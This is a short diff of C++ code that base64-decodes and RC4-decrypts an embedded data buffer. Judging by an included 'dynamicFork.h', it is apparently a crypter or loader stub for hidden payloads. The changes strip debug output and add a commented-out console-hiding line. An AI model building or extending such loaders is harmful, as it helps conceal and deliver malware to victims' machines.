@@ -5,8 +5,10 @@
 #include <fstream>
 #include "dynamicFork.h"
 
+
 #define sizeOfArray(arr) (sizeof(arr)/sizeof(arr[0]))
 #define ENC_DATA_SIZE (sizeOfArray(encData))
+
 
 #pragma comment(lib, "Crypt32.lib")
 
@@ -17,8 +19,6 @@ std::pair<char*, DWORD> decryptData(unsigned char encBufferInput[], const char* 
 	char* decodedBuffer = new char[*decodedSize]();
 
 	CryptStringToBinaryA((char*)encBufferInput, ENC_DATA_SIZE, CRYPT_STRING_BASE64, (BYTE*)decodedBuffer, decodedSize, NULL, NULL);
-
-	std::cout << "Sizeof of array in bytes: " << ENC_DATA_SIZE << std::endl;
 
 	rc4Algorithm rc4;
 
@@ -34,8 +34,9 @@ std::pair<char*, DWORD> decryptData(unsigned char encBufferInput[], const char* 
 
 
 int main(int argc, char* argv[]) {
-	const char* key = "Cervantes";
 
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	
 	std::pair <char*, DWORD> decOut;
 	decOut = decryptData(encData, key);
 
